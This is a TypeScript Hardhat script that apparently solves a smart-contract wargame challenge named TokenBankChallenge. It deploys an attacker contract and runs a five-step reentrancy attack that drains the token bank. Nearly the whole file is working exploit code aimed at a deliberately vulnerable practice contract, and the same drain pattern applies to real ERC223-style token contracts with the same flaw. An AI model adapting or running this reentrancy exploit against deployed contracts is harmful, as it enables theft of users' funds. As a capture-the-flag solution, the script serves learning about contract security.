import { ethers } from 'hardhat';

const address = '0x56b1Ab1d1e648FE345A9EFD1a19cBC99001cAe9f';

async function main() {
  const [hacker] = await ethers.getSigners();

  const [targetFactory, attackerFactory, tokenFactory] = await Promise.all([
    ethers.getContractFactory('TokenBankChallenge'),
    ethers.getContractFactory('TokenBankChallengeAttacker'),
    ethers.getContractFactory('SimpleERC223Token'),
  ]);

  console.log('attaching target');
  const target = await targetFactory.attach(address);
  await target.deployed();
  console.log('target deployed to: ', target.address);

  console.log('attaching token');
  const tokenAddress = await target.token();
  const token = await tokenFactory.attach(tokenAddress);
  await token.deployed();
  console.log('token deployed to: ', token.address);

  console.log('deploying attacker');
  const attacker = await attackerFactory.deploy(target.address);
  await attacker.deployed();
  console.log('attacker deployed to: ', attacker.address);

  let tx;

  console.log('1 - withdraw tokens to hacker account');
  const hackerTokenBalance = await target.connect(hacker).balanceOf(hacker.address);
  tx = await target.connect(hacker).withdraw(hackerTokenBalance);
  await tx.wait();

  console.log('2 - deposit tokens to attacker contract through target');
  tx = await token
    .connect(hacker)
    ['transfer(address,uint256)'](attacker.address, hackerTokenBalance);
  await tx.wait();

  console.log('3 - transfer tokens to target from contract');
  tx = await attacker.connect(hacker).transfer();
  await tx.wait();

  console.log('4 - attack and reentrancy');
  tx = await attacker.connect(hacker).attack({
    gasLimit: 100000,
  });
  await tx.wait();

  console.log('5 - withdraw to owner');
  tx = await attacker.connect(hacker).withdraw();
  await tx.wait();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
